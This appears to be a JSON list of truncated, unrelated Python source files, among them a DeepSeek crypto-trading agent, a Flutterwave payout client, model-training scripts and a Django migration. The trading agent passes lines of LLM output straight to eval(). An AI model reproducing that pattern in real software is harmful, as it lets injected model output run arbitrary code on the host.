\"where\": { \"tags\": { \"containsAll\": [\"red\", \"wine\"] } } }`.\n  - Nested properties are supported. Just translate them into dot notation. Example: `{ \"where\": { \"author.name\": \"John\" } }`.\n  - Array of numbers are not supported.\n  - Array of booleans are not supported.\n\nYou need to generate some examples in the following format:\n\n```\n[\n    { \"query\": \"QUERY 1\", \"schema\": \"SCHEMA 1\", \"generatedQuery\": \"GENERATED_QUERY 1\" },\n    { \"query\": \"QUERY 2\", \"schema\": \"SCHEMA 2\", \"generatedQuery\": \"GENERATED_QUERY 2\" },\n    { \"query\": \"QUERY 3\", \"schema\": \"SCHEMA 3\", \"generatedQuery\": \"GENERATED_QUERY 3\" },\n]\n```\n\nReply with the generated query in a valid JSON format only. Nothing else.\n\"\"\"\n\n\nclass OllamaProvider:\n    def __init__(self, model_name: str = \"qwen2.5:14b\"):\n        self.JSONL_FILE = \"synthetic_data.jsonl\"\n        self.CSV_FILE = \"synthetic_data.csv\"\n        self.OLLAMA_URL = os.getenv(\"OLLAMA_URL\", \"http://127.0.0.1:11434/v1\")\n        self.OLLAMA_KEY = os.getenv(\"OLLAMA_KEY\", \"placeholder-not-used\")\n        self.model_name = model_name\n        self.client = OpenAI(\n            base_url=self.OLLAMA_URL,\n            api_key=self.OLLAMA_KEY,\n        )\n\n    def generate(self, topic: str, batch_num: int):\n        print(f\"Generating dataset {batch_num}/10 for {topic}...\")\n        response = self.client.chat.completions.create(\n            model=self.model_name,\n            messages=[\n                {\"role\": \"system\", \"content\": SYSTEM_PROMPT},\n                {\n                    \"role\": \"user\",\n                    \"content\": f\"Generate 10 example datasets. The theme for these questions and schema must be: {topic}.\",\n                },\n            ],\n        )\n        print(f\"Completed dataset {batch_num}/10 for {topic}\")\n        return repair_json(response.choices[0].message.content)\n\n    def save(self, data):\n        if not self.validate_data(data):\n            print(\"Invalid data structure, skippi",
    "from fastapi import APIRouter, HTTPException, status\nfrom fastapi.responses import HTMLResponse\nfrom api.modules.webhook import send_discord_msg\nfrom api.modules.emailscript import resend_mail\nfrom api.models import form_model\n\n# Create an instance of FastAPI's APIRouter\napp = APIRouter()\n\n@app.get(\"/\")\nasync def index_text():\n    \"\"\"\n    Endpoint that responds with a simple greeting message.\n    \n    Returns:\n        dict: A message with a FastAPI greeting.\n    \"\"\"\n    return {\"message\": \"Hello from FastAPI!\"}\n\n@app.post(\"/send_email\", response_class=HTMLResponse)\nasync def send_email(form: form_model):\n    \"\"\"\n    Endpoint that processes sending an email and a Discord notification.\n    \n    Validates the provided form data and performs two operations:\n    1. Attempts to send an email using the `resend_mail` function.\n    2. If the email sending is successful, attempts to send a message to Discord using `send_discord_msg`.\n    \n    Args:\n        form (form_model): The submitted form data, which includes the user's name, email, subject, and message.\n    \n    Raises:\n        HTTPException: If any operation (email sending or Discord notification) fails, an HTTP exception is raised with the corresponding status code.\n    \n    Returns:\n        HTTPException: If both operations succeed, a response with status code 200 (OK) is returned.\n    \"\"\"\n    \n    # Attempt to send the email using the form data\n    response = resend_mail(\n        username=form.name,\n        client_mail=form.mail,\n        issue=form.issue,\n        message=form.message\n    )\n\n    # If email sending fails, raise an HTTPException with status 405\n    if not response:\n        raise HTTPException(\n            status_code=status.HTTP_405_METHOD_NOT_ALLOWED,\n            detail='Ooops, mail sending failed'\n        )\n\n    # Attempt to send a Discord message\n    discord_request = send_discord_msg()\n\n    # If Discord message sending fails, raise an HTTPException with status 405\n    if not discord_request:\n        raise HTTPException(\n            status_code=status.HTTP_405_METHOD_NOT_ALLOWED,\n            detail='Discord webhook failed'\n        )\n\n    # If both operations succeed, return a success message with status 200\n    raise HTTPException(\n        status_code=status.HTTP_200_OK,\n        detail='Everything is fine.'\n    )\n",
    "import networkx as nx\r\nimport matplotlib.pyplot as plt\r\n\r\nclass Graf:\r\n    def __init__(self):\r\n        self.graph = nx.Graph()\r\n\r\n    def add_node(self, node):\r\n        self.graph.add_node(node)\r\n\r\n    def add_edge(self, node1, node2, weight=1):\r\n        self.graph.add_edge(node1, node2, weight=weight)\r\n\r\n    def visualize_graph(self):\r\n        pos = nx.spring_layout(self.graph)\r\n        weights = nx.get_edge_attributes(self.graph, 'weight')\r\n        nx.draw(self.graph, pos, with_labels=True, node_color='lightblue', node_size=500, font_size=10, font_weight='bold')\r\n        nx.draw_networkx_edge_labels(self.graph, pos, edge_labels=weights)\r\n        plt.show()\r\n\r\n    def shortest_path(self, source, target):\r\n        try:\r\n            path = nx.shortest_path(self.graph, source=source, target=target, weight='weight')\r\n            return path\r\n        except nx.NetworkXNoPath:\r\n            return f\"No path exists between {source} and {target}.\"\r\n\r\n    def visual_shortest_path(self, source, target):\r\n        try:\r\n            path = self.shortest_path(source, target)\r\n            if isinstance(path, str):\r\n                print(path)\r\n                return\r\n\r\n            subgraph = self.graph.subgraph(path)\r\n            pos = nx.spring_layout(self.graph)\r\n            nx.draw(self.graph, pos, with_labels=True, node_color='lightblue', node_size=500, font_size=10, font_weight='bold')\r\n            nx.draw(subgraph, pos, with_labels=True, edge_color='red', node_color='orange', width=2, node_size=600)\r\n            plt.show()\r\n        except nx.NetworkXNoPath:\r\n            print(f\"No path exists between {source} and {target}.\")\r\n\r\n    # Metode tambahan:\r\n\r\n    def is_connected(self):\r\n        \"\"\"Cek apakah graf terhubung.\"\"\"\r\n        return nx.is_connected(self.graph)\r\n\r\n    def node_degree(self, node):\r\n        \"\"\"Kembalikan derajat node tertentu.\"\"\"\r\n        if node in self.graph:\r\n            return self.graph.degree[node]\r\n        else:\r\n            return f\"Node {node} tidak ada dalam graf.\"\r\n\r\n    def clustering_coefficient(self):\r\n        \"\"\"Menghitung koefisien clustering untuk setiap node.\"\"\"\r\n        return nx.clustering(self.graph)\r\n\r\n    def find_bridges(self):\r\n        \"\"\"Mencari edge yang merupakan bridge (penghubung kritis).\"\"\"\r\n        return list(nx.bridges(self.graph))\r\n\r\n    def find_articulation_points(self):\r\n        \"\"\"Mencari articulation points (node kritis).\"\"\"\r\n        return list(nx.articulation_points(self.graph))\r\n\r\n# Contoh implementasi:\r\ngraph = Graf()\r\n\r\n# Menambah node\r\ngraph.add_node(1)\r\ngraph.add_node(2)\r\ngraph.add_node(3)\r\ngraph.add_node(4)\r\ngraph.add_node(5)\r\n\r\n# Menambah edge\r\ngraph.add_edge(1, 2, weight=4.5)\r\ngraph.add_edge(1, 3, weight=3.2)\r\ngraph.add_edge(2, 4, weight=2.7)\r\ngraph.add_edge(3, 4, weight=1.8)\r\ngraph.add_edge(1, 4, weight=6.7)\r\ngraph.add_edge(3, 5, weight=2.7)\r\n\r\n# Visualisasi graf\r\ngraph.visualize_graph()\r\n\r\n# Jalur terpendek\r\npath = graph.shortest_path(1, 5)\r\nprint(\"Shortest path:\", path)\r\n\r\n# Visualisasi jalur terpendek\r\ngraph.visual_shortest_path(1, 5)\r\n\r\n# Penggunaan metode tambahan\r\nprint(\"Is connected:\", graph.is_connected())\r\nprint(\"Node degree:\", graph.node_degree(3))\r\nprint(\"Clustering coefficient:\", graph.clustering_coefficient())\r\nprint(\"Bridges:\", graph.find_bridges())\r\nprint(\"Articulation points:\", graph.find_articulation_points())\r\n",
    "# Please install OpenAI SDK first: `pip3 install openai`\n\nfrom openai import OpenAI\nfrom dotenv import load_dotenv\nimport os\nfrom Tools import Tool1, Tool2, Tool3\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Get API key from environment variables\napi_key = os.getenv('DEEPSEEK_API_KEY')\n\nclient = OpenAI(api_key=api_key, base_url=\"https://api.deepseek.com\")\n\ndef parse_tool_response(response_text):\n    \"\"\"Parse the AI response to extract multiple tool calls\"\"\"\n    tools = []\n    current_tool = {}\n    \n    for line in response_text.strip().split('\\n'):\n        if line.startswith('TOOL:'):\n            if current_tool:\n                tools.append(current_tool)\n            current_tool = {'tool': line.replace('TOOL:', '').strip()}\n        elif line.startswith('ARGS:'):\n            current_tool['args'] = eval(line.replace('ARGS:', '').strip())\n        elif line.startswith('REASON:'):\n            current_tool['reason'] = line.replace('REASON:', '').strip()\n    \n    if current_tool:\n        tools.append(current_tool)\n    \n    return tools\n\ndef execute_tool(tool_name, args):\n    \"\"\"Execute the specified tool with given arguments\"\"\"\n    print(f\"\\n[Tool Execution]\")\n    print(f\"Tool Name: {tool_name}\")\n    print(f\"Arguments: {args}\")\n    \n    tool_mapping = {\n        'analyze_crypto_price': Tool1.analyze_crypto_price,\n        'generate_trading_strategy': Tool2.generate_trading_strategy,\n        'calculate_portfolio_metrics': Tool3.calculate_portfolio_metrics\n    }\n    \n    try:\n        if tool_name in tool_mapping:\n            if isinstance(args, dict):\n                result = tool_mapping[tool_name](**args)\n                print(f\"Execution Result: {result}\")\n                return result\n            elif isinstance(args, (list, tuple)):\n                result = tool_mapping[tool_name](*args)\n                print(f\"Execution Result: {result}\")\n                return result\n            else:\n                result = tool_mapping[tool_name](args)\n                print(f\"Execution Result: {result}\")\n                return result\n        else:\n            return {\"status\": \"error\", \"message\": f\"Tool {tool_name} not found\"}\n    except Exception as e:\n        error_result = {\n            \"status\": \"error\",\n            \"message\": f\"Error executing {tool_name}: {str(e)}\",\n            \"args_received\": str(args)\n        }\n        print(f\"Execution Error: {error_result}\")\n        return error_result\n\ndef run_agent(user_input):\n    \"\"\"Main function to run the agent\"\"\"\n    print(\"\\n[User Input]\")\n    print(f\"Query: {user_input}\")\n    \n    response = client.chat.completions.create(\n        model=\"deepseek-chat\",\n        messages=[\n            {\"role\": \"system\", \"content\": \"\"\"You are a crypto trading assistant. Analyze what tools would be most appropriate to use from the available tools.\n                Current tools:\n                - analyze_crypto_price: Analyzes current price and trends for a cryptocurrency\n                - generate_trading_strategy: Generates trading strategy based on risk level and budget\n                - calculate_portfolio_metrics: Calculates portfolio metrics for a wallet address\n                \n                You can recommend multiple tools if needed. For each tool, respond in this format:\n                TOOL: [tool_name]\n                ARGS: [arguments as Python literal]\n                REASON: [brief explanation]\n                \n                Repeat this format for each tool needed.\"\"\"},\n            {\"role\": \"user\", \"content\": user_input},\n        ],\n        stream=False\n    )\n\n    print(\"\\n[AI Response]\")\n    print(response.choices[0].message.content)\n    \n    tool_calls = parse_tool_response(response.choices[0].message.content)\n    print(\"\\n[Parsed Tool Calls]\")\n    print(f\"Number of tools to execute: {len(tool_calls)}\")\n    for i, tool_call in enumerate(tool_calls, 1):\n        print(f\"\\nTool Call {i}:\")\n        print(f\"Tool: {tool_call['tool']}\")\n        print(f\"Arguments: {tool_call['args']}\")\n        print(f\"Reason: {tool_call['reason']}\")\n    \n    results = []\n    for tool_call in tool_calls:\n        result = execute_tool(tool_call['tool'], tool_call['args'])\n        results.append({\n            'tool': tool_call['tool'],\n            'reason': tool_call['reason'],\n            'result': result\n        })\n    \n    return results\n\ndef main():\n    print(\"\\nWelcome to the Crypto Trading Assistant!\")\n    print(\"Available tools:\")\n    print(\"- analyze_crypto_price: Analyzes current price and trends for a cryptocurrency\")\n    print(\"- generate_trading_strategy: Generates trading strategy based on risk level and budget\")\n    print(\"- calculate_portfolio_metrics: Calculates portfolio metrics for a wallet address\")\n    \n    while True:\n        print(\"\\n\" + \"=\"*50)\n        user_query = input(\"\\nEnter your query (or 'exit' to quit): \")\n        \n        if user_query.lower() in ['exit', 'quit', 'q']:\n            print(\"\\nThank you for using the Crypto Trading Assistant. Goodbye!\")\n  ",
    "import requests\r\nimport json\r\nimport os\r\nimport uuid\r\nfrom typing import Dict\r\n\r\n\r\nclass flutterwave:\r\n    def __init__(self, secret_key: str, threshold_amount: float):\r\n        \"\"\"\r\n        Initializes the FlutterwavePayment class with the provided API secret key and threshold amount.\r\n        \"\"\"\r\n        self.secret_key = secret_key\r\n        self.headers = {\r\n            \"accept\": \"application/json\",\r\n            \"Authorization\": f\"Bearer {self.secret_key}\",\r\n            \"Content-Type\": \"application/json\"\r\n        }\r\n        self.thresholdAmount = threshold_amount\r\n        self.transferURL = \"https://api.flutterwave.com/v3/transfers\"\r\n        self.accountResolveURL = \"https://api.flutterwave.com/v3/accounts/resolve\"\r\n        self.transferStatusURL = \"https://api.flutterwave.com/v3/transfers\"\r\n        self.walletBalanceURL = \"https://api.flutterwave.com/v3/payout-subaccounts/\"\r\n\r\n    def getTransferStatus(self, transactionReference: str) -> dict:\r\n        \"\"\"\r\n        Retrieves the status of a bank transfer using Flutterwave's API.\r\n\r\n        This function checks the current status of a transfer transaction \r\n        using the unique transaction reference. It communicates with Flutterwave's \r\n        API to fetch detailed information about the transfer.\r\n\r\n        Parameters:\r\n            transactionReference (str): \r\n                A unique identifier for the transaction, typically generated \r\n                when initiating the transfer. This is used to track the transaction.\r\n\r\n        Returns:\r\n            dict: \r\n                A dictionary containing the response from Flutterwave's transfer status API. \r\n                Key components of the response include:\r\n                - `status` (str): The status of the request (e.g., \"success\", \"failed\").\r\n                - `message` (str): A description of the request's result.\r\n                - `data` (list, optional): If successful, this contains a list of transactions \r\n                matching the reference, with each transaction containing:\r\n                    - `id` (int): Unique identifier for the transaction.\r\n                    - `reference` (str): The transaction reference.\r\n                    - `status` (str): The current status of the transaction \r\n                    (e.g., \"SUCCESSFUL\", \"FAILED\", \"PENDING\").\r\n                    - `complete_message` (str): A detailed message about the transaction's state.\r\n                    - `amount` (float): The amount transferred.\r\n\r\n        Process:\r\n            1. Constructs the API URL using the provided transaction reference.\r\n            2. Makes a GET request to Flutterwave's transfer status endpoint.\r\n            3. Parses the JSON response and returns it as a dictionary.\r\n            \r\n        Notes:\r\n            - Handle network errors, timeouts, or invalid responses gracefully in the calling code.\r\n        \"\"\"\r\n        status = \"PENDING\"\r\n        url = f\"{self.transferStatusURL}?reference={transactionReference}\"\r\n        while status == \"PENDING\":\r\n            transferStatusResponse = json.loads(requests.get(url, headers= self.headers).text)\r\n            status = transferStatusResponse['data'][0]['status'] \r\n        return transferStatusResponse\r\n\r\n    def resolveAccount(self, accountNumber: str, bankCode: str) -> dict:\r\n        \"\"\"\r\n        Resolves a bank account using Flutterwave's API.\r\n\r\n        This function verifies the validity of a bank account by checking the provided \r\n        account number and bank code against Flutterwave's account resolution service. \r\n        It returns detailed information about the account, including the account holder's \r\n        name and status.\r\n\r\n        Parameters:\r\n            accountNumber (str): \r\n                The bank account number to be resolved. This should be a valid account \r\n                number associated with the specified bank code.\r\n            bankCode (str): \r\n                The unique code identifying the bank where the account is held. This is \r\n                typically a numeric or alphanumeric code (e.g., \"044\" for Access Bank in Nigeria).\r\n\r\n        Returns:\r\n            dict: \r\n                A dictionary containing the response from Flutterwave's account resolution API. \r\n                This includes:\r\n                - `status` (str): Indicates the success or failure of the resolution request \r\n                (e.g., \"success\", \"failed\").\r\n                - `message` (str): A message describing the result of the resolution attempt.\r\n                - `data` (dict, optional): If the resolution is successful, this contains \r\n                detailed information about the account, such as:\r\n                    - `account_number` (str): The validated account number.\r\n                    - `account_name` (str): The name of the account holder.\r\n\r\n        Process:\r\n            1. Prepares the payload with the `accountNumber` and `bankCode`.\r\n            2. Makes a POST request to Flutterwave's account resolution endpoint.\r\n",
    "import json\nimport os\n\nimport click\nimport numpy as np\nimport torch\nimport torch.distributed as dist\nfrom safetensors.torch import safe_open\nfrom torch.nn.parallel import DistributedDataParallel as DDP\nfrom torch.utils.data import DataLoader, Dataset\nfrom torch.utils.data.distributed import DistributedSampler\n\nimport wandb\n\ntorch.backends.cuda.matmul.allow_tf32 = True\ntorch.backends.cudnn.allow_tf32 = True\n\nfrom PIL import Image\n\nfrom model import DDPDConfig, DDPDModel, configure_optimizers, print0\n\nMASK_IDX = 0\n\n\nclass ImageTokenDataset(Dataset):\n    def __init__(\n        self,\n        safetensor_path=\"/home/ubuntu/simo/nano-diffusion-speedrun/tokenize_dataset/preprocessed_dataset/imagenet_di8x8.safetensors\",\n        debug=False,\n    ):\n        print(f\"Initializing ImageTokenDataset with path: {safetensor_path}\")\n        self.safetensor_path = safetensor_path\n\n        metadata_path = safetensor_path.replace(\".safetensors\", \"_metadata.json\")\n        print(f\"Loading metadata from: {metadata_path}\")\n\n        with open(metadata_path, \"r\") as f:\n            self.metadata = json.load(f)\n            self.total_samples = self.metadata[\"total_samples\"]\n            print(f\"Total samples in metadata: {self.total_samples}\")\n\n        print(f\"Loading tensors from: {safetensor_path}\")\n\n        with safe_open(safetensor_path, framework=\"pt\") as f:\n            self.indices = f.get_tensor(\"indices\").to(torch.uint16).long()\n            self.labels = f.get_tensor(\"labels\").long()\n            print(\n                f\"Loaded indices shape: {self.indices.shape}, labels shape: {self.labels.shape}\"\n            )\n\n        if debug:\n            samplesze = 64\n            self.indices = self.indices[:samplesze]\n            self.labels = self.labels[:samplesze]\n            self.total_samples = samplesze\n            print(f\"Debug mode: reduced to {samplesze} samples\")\n            print(self.labels)\n\n    def __len__(self):\n        return int(self.total_samples)\n\n    def __getitem__(self, idx):\n        try:\n            # Get indices and reshape to 1D\n            indices = self.indices[idx].reshape(-1)\n            label = self.labels[idx]\n            return indices, label\n        except Exception as e:\n            print(f\"Error in __getitem__ for idx {idx}: {e}\")\n            raise\n\n\nclass MNISTTokenDataset(Dataset):\n    def __init__(self, debug=False):\n        print(\"Initializing MNISTTokenDataset\")\n        from torchvision import transforms\n        from torchvision.datasets import MNIST\n\n        transform = transforms.Compose(\n            [\n                transforms.ToTensor(),\n                transforms.Resize((32, 32)),  # Resize to 8x8 like the ImageNet dataset\n                transforms.Lambda(lambda x: (x * 7.0).long()),  # Scale to 16-bit range\n            ]\n        )\n\n        self.mnist = MNIST(\n            root=\"./data\", train=True, download=True, transform=transform\n        )\n        self.total_samples = len(self.mnist)\n        print(f\"Total samples: {self.total_samples}\")\n\n    def __len__(self):\n        return int(self.total_samples)\n\n    def __getitem__(self, idx):\n        try:\n            image, label = self.mnist[idx]\n            # Flatten the 8x8 image into 64 tokens\n            indices = image.reshape(-1)\n            return indices, label\n        except Exception as e:\n            print(f\"Error in __getitem__ for idx {idx}: {e}\")\n            raise\n\n\ndef setup_distributed():\n    if dist.is_initialized():\n        return\n\n    if \"LOCAL_RANK\" not in os.environ:\n        os.environ[\"LOCAL_RANK\"] = \"0\"\n\n    local_rank = int(os.environ[\"LOCAL_RANK\"])\n    torch.cuda.set_device(local_rank)\n    dist.init_process_group(backend=\"nccl\")\n\n\ndef cleanup_distributed():\n    if dist.is_initialized():\n        dist.destroy_process_group()\n\n\ndef train_step(\n    batch,\n    planner,\n    denoiser,\n    grad_accumulation_steps,\n):\n    device = \"cuda\"\n    indices, labels = batch\n    indices = indices.to(device)\n    labels = labels.to(device)\n    t = torch.rand(indices.shape[0], device=device)\n\n    # Create binary mask based on timestep t\n    mask = torch.bernoulli(t.unsqueeze(1).expand(-1, indices.shape[1])).bool()\n\n    # print0(f\"mask shape: {mask.shape}, mask: {mask[:3, :3]}\")\n\n    # Create corrupted version by cloning original indices\n    input_indices = indices.clone()\n    # corrupted_as_null = indices.clone()\n    # corrupted_as_null[mask] = MASK_IDX\n\n    # Only corrupt tokens where mask is True\n    # Sample random tokens from vocab range for corrupted positions\n    num_masked = mask.sum().item()\n    if num_masked > 0:\n        input_indices[mask] = torch.randint(0, MASK_IDX, (num_masked,), device=device)\n    corrupted_as_null = input_indices.clone()\n\n    planner_logits, planner_loss = planner(input_indices, t, labels, targets=mask)\n    planner_loss = planner_loss / grad_accumulation_steps\n    planner_loss.backward()\n\n    # print acc of planner\n    with torch.no_grad():\n        # since planner is binary classification, we can use accuracy\n        ",
    "\"\"\"\r\nUtility Functions for Speaker Verification\r\nOriginally adapted from voxceleb_trainer:\r\nhttps://github.com/clovaai/voxceleb_trainer/blob/master/tuneThreshold.py\r\n\"\"\"\r\n\r\nimport os\r\nimport numpy as np\r\nimport torch\r\n\r\nfrom operator import itemgetter\r\nfrom sklearn import metrics\r\nimport torch.nn.functional as F\r\n\r\n\r\ndef init_args(args):\r\n    \"\"\"\r\n    Initialize file paths for saving scores and model checkpoints.\r\n\r\n    Args:\r\n        args: Command-line or config arguments object, assumed to have \r\n              'save_path' attribute.\r\n\r\n    Returns:\r\n        Updated args with new attributes:\r\n          - score_save_path: The path to save score logs.\r\n          - model_save_path: The path to save model checkpoints.\r\n    \"\"\"\r\n    args.score_save_path = os.path.join(args.save_path, 'score.txt')\r\n    args.model_save_path = os.path.join(args.save_path, 'model')\r\n    os.makedirs(args.model_save_path, exist_ok=True)\r\n    return args\r\n\r\n\r\ndef tuneThresholdfromScore(scores, labels, target_fa, target_fr=None):\r\n    \"\"\"\r\n    Compute threshold(s) based on desired false-accept (FA) or false-reject (FR) rates.\r\n    \r\n    This function uses an ROC curve to derive specific thresholds that match\r\n    given FA or FR targets. It also computes the EER (Equal Error Rate).\r\n\r\n    Args:\r\n        scores (list or np.array): List/array of similarity scores from pairs/trials.\r\n        labels (list or np.array): Binary labels (1 for same speaker, 0 for different).\r\n        target_fa (list of floats): Desired false acceptance rates.\r\n        target_fr (list of floats, optional): Desired false reject rates.\r\n\r\n    Returns:\r\n        tunedThreshold (list): A list of [threshold, false_accept_rate, false_reject_rate].\r\n        eer (float): Equal Error Rate (percentage).\r\n        fpr (np.array): False-positive rates at each threshold.\r\n        fnr (np.array): False-negative rates at each threshold.\r\n    \"\"\"\r\n    fpr, tpr, thresholds = metrics.roc_curve(labels, scores, pos_label=1)\r\n    fnr = 1 - tpr\r\n    tunedThreshold = []\r\n\r\n    # If target_fr is provided, find thresholds closest to each FR target.\r\n    if target_fr:\r\n        for tfr in target_fr:\r\n            idx = np.nanargmin(np.absolute((tfr - fnr)))\r\n            tunedThreshold.append([thresholds[idx], fpr[idx], fnr[idx]])\r\n\r\n    # Find thresholds closest to each FA target.\r\n    for tfa in target_fa:\r\n        idx = np.nanargmin(np.absolute((tfa - fpr)))\r\n        tunedThreshold.append([thresholds[idx], fpr[idx], fnr[idx]])\r\n\r\n    # EER is the rate where FPR and FNR are equal (or closest to each other).\r\n    idxE = np.nanargmin(np.absolute((fnr - fpr)))\r\n    eer = max(fpr[idxE], fnr[idxE]) * 100\r\n\r\n    return tunedThreshold, eer, fpr, fnr\r\n\r\n\r\ndef ComputeErrorRates(scores, labels):\r\n    \"\"\"\r\n    Create lists of false-negative rates (FNR), false-positive rates (FPR),\r\n    and thresholds. These can be used for plotting DET curves or computing\r\n    additional metrics like minDCF.\r\n\r\n    Args:\r\n        scores (list or np.array): Verification scores.\r\n        labels (list or np.array): Binary labels.\r\n\r\n    Returns:\r\n        fnrs (list of floats): False-negative rates at each threshold.\r\n        fprs (list of floats): False-positive rates at each threshold.\r\n        thresholds (list of floats): Threshold values at which FNR and FPR are computed.\r\n    \"\"\"\r\n    # Sort scores (and keep track of their indices)\r\n    sorted_indexes, thresholds = zip(*sorted(\r\n        [(index, threshold) for index, threshold in enumerate(scores)],\r\n        key=itemgetter(1)\r\n    ))\r\n\r\n    # Rearrange labels to match sorted scores\r\n    labels_sorted = [labels[i] for i in sorted_indexes]\r\n\r\n    fnrs = []\r\n    fprs = []\r\n\r\n    # Compute cumulative false negatives and false positives\r\n    for i, lab in enumerate(labels_sorted):\r\n        if i == 0:\r\n            fnrs.append(lab)\r\n            fprs.append(1 - lab)\r\n        else:\r\n            fnrs.append(fnrs[i - 1] + lab)\r\n            fprs.append(fprs[i - 1] + 1 - lab)\r\n\r\n    # Normalize FNR and FPR\r\n    total_positives = sum(labels_sorted)  # total positives\r\n    total_negatives = len(labels_sorted) - total_positives  # total negatives\r\n\r\n    fnrs = [x / float(total_positives) for x in fnrs] if total_positives > 0 else fnrs\r\n    fprs = [1 - (x / float(total_negatives)) for x in fprs] if total_negatives > 0 else fprs\r\n\r\n    return fnrs, fprs, thresholds\r\n\r\n\r\ndef ComputeMinDcf(fnrs, fprs, thresholds, p_target, c_miss, c_fa):\r\n    \"\"\"\r\n    Computes the minimum detection cost function (minDCF) over a range of thresholds.\r\n\r\n    This is a standard metric for speaker verification (and other detection tasks),\r\n    as defined by the NIST evaluations.\r\n\r\n    Args:\r\n        fnrs (list of floats): False-negative rates.\r\n        fprs (list of floats): False-positive rates.\r\n        thresholds (list of floats): Corresponding thresholds for fnrs/fprs.\r\n        p_target (float): Prior probability of the target condition (same speaker).\r\n        c_miss (float): Cost of a miss (false reje",
    "import os\nimport json\nimport argparse\nimport itertools\nimport math\nimport torch\nfrom torch import nn, optim\nfrom torch.nn import functional as F\nfrom torch.utils.data import DataLoader\nfrom torch.utils.tensorboard import SummaryWriter\n\n# from tensorboardX import SummaryWriter\nimport torch.multiprocessing as mp\nimport torch.distributed as dist\nfrom torch.nn.parallel import DistributedDataParallel as DDP\nfrom torch.cuda.amp import autocast, GradScaler\nimport tqdm\n\nimport commons\nimport utils\nfrom data_utils import TextAudioLoader, TextAudioCollate, DistributedBucketSampler\nfrom models import (\n    SynthesizerTrn,\n    MultiPeriodDiscriminator,\n    MultiScaleSubbandCQTDiscriminator,\n    DurationDiscriminatorV1,\n    DurationDiscriminatorV2,\n    AVAILABLE_FLOW_TYPES,\n    AVAILABLE_DURATION_DISCRIMINATOR_TYPES\n)\nfrom losses import generator_loss, discriminator_loss, feature_loss, kl_loss\nfrom preprocess.mel_processing import mel_spectrogram_torch, spec_to_mel_torch\nfrom text.symbols import symbols\n\ntorch.backends.cudnn.benchmark = True\nglobal_step = 0\n\n\ndef main():\n    \"\"\"Assume Single Node Multi GPUs Training Only\"\"\"\n    assert torch.cuda.is_available(), \"CPU training is not allowed.\"\n\n    n_gpus = torch.cuda.device_count()\n    os.environ[\"MASTER_ADDR\"] = \"localhost\"\n    os.environ[\"MASTER_PORT\"] = \"6060\"\n\n    hps = utils.get_hparams()\n    mp.spawn(\n        run,\n        nprocs=n_gpus,\n        args=(\n            n_gpus,\n            hps,\n        ),\n    )\n\n\ndef run(rank, n_gpus, hps):\n    global global_step\n    if rank == 0:\n        logger = utils.get_logger(hps.model_dir)\n        logger.info(hps)\n        utils.check_git_hash(hps.model_dir)\n        writer = SummaryWriter(log_dir=hps.model_dir)\n        writer_eval = SummaryWriter(log_dir=os.path.join(hps.model_dir, \"eval\"))\n\n    dist.init_process_group(\n        backend=\"nccl\", init_method=\"env://\", world_size=n_gpus, rank=rank\n    )\n    torch.manual_seed(hps.train.seed)\n    torch.cuda.set_device(rank)\n\n    if (\n        \"use_mel_posterior_encoder\" in hps.model.keys()\n        and hps.model.use_mel_posterior_encoder == True\n    ):\n        print(\"Using mel posterior encoder for VITS2\")\n        posterior_channels = 80  # vits2\n        hps.data.use_mel_posterior_encoder = True\n    else:\n        print(\"Using lin posterior encoder for VITS1\")\n        posterior_channels = hps.data.filter_length // 2 + 1\n        hps.data.use_mel_posterior_encoder = False\n\n    train_dataset = TextAudioLoader(hps.data.training_files, hps.data)\n    train_sampler = DistributedBucketSampler(\n        train_dataset,\n        hps.train.batch_size,\n        [32, 300, 400, 500, 600, 700, 800, 900, 1000],\n        num_replicas=n_gpus,\n        rank=rank,\n        shuffle=True,\n    )\n\n    collate_fn = TextAudioCollate()\n    train_loader = DataLoader(\n        train_dataset,\n        num_workers=8,\n        shuffle=False,\n        pin_memory=True,\n        collate_fn=collate_fn,\n        batch_sampler=train_sampler,\n    )\n    if rank == 0:\n        eval_dataset = TextAudioLoader(hps.data.validation_files, hps.data)\n        eval_loader = DataLoader(\n            eval_dataset,\n            num_workers=8,\n            shuffle=False,\n            batch_size=hps.train.batch_size,\n            pin_memory=True,\n            drop_last=False,\n            collate_fn=collate_fn,\n        )\n    # some of these flags are not being used in the code and directly set in hps json file.\n    # they are kept here for reference and prototyping.\n\n    if (\n        \"use_transformer_flows\" in hps.model.keys()\n        and hps.model.use_transformer_flows == True\n    ):\n        use_transformer_flows = True\n        transformer_flow_type = hps.model.transformer_flow_type\n        print(f\"Using transformer flows {transformer_flow_type} for VITS2\")\n        assert (\n            transformer_flow_type in AVAILABLE_FLOW_TYPES\n        ), f\"transformer_flow_type must be one of {AVAILABLE_FLOW_TYPES}\"\n    else:\n        print(\"Using normal flows for VITS1\")\n        use_transformer_flows = False\n\n    if (\n        \"use_spk_conditioned_encoder\" in hps.model.keys()\n        and hps.model.use_spk_conditioned_encoder == True\n    ):\n        if hps.data.n_speakers == 0:\n            print(\"Warning: use_spk_conditioned_encoder is True but n_speakers is 0\")\n        print(\n            \"Setting use_spk_conditioned_encoder to False as model is a single speaker model\"\n        )\n        use_spk_conditioned_encoder = False\n    else:\n        print(\"Using normal encoder for VITS1\")\n        use_spk_conditioned_encoder = False\n\n    if (\n        \"use_noise_scaled_mas\" in hps.model.keys()\n        and hps.model.use_noise_scaled_mas == True\n    ):\n        print(\"Using noise scaled MAS for VITS2\")\n        use_noise_scaled_mas = True\n        mas_noise_scale_initial = 0.01\n        noise_scale_delta = 2e-6\n    else:\n        print(\"Using normal MAS for VITS1\")\n        use_noise_scaled_mas = False\n        mas_noise_scale_initial = 0.0\n        noise_scale_delta = 0.0\n\n    if (\n        \"use_duratio",
    "# Generated by Django 5.1.2 on 2024-10-28 17:56\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        (\"bus\", \"0001_initial\"),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name=\"BusRoute\",\n            fields=[\n                (\n                    \"id\",\n                    models.BigAutoField(\n                        auto_created=True,\n                        primary_key=True,\n                        serialize=False,\n                        verbose_name=\"ID\",\n                    ),\n                ),\n                (\n                    \"bus_code\",\n                    models.CharField(\n                        choices=[\n                            (\"A\", \"Seniors (Kurmannapalem)\"),\n                            (\"B\", \"Juniors (Scindia)\"),\n                            (\"C\", \"Juniors (Srikakulam)\"),\n                            (\"D\", \"Seniors (Srikakulam)\"),\n                            (\"E\", \"Juniors (Bobbili)\"),\n                            (\"F\", \"Seniors (Saluru)\"),\n                            (\"G\", \"Seniors (NAD - Karasa)\"),\n                            (\"H\", \"Juniors 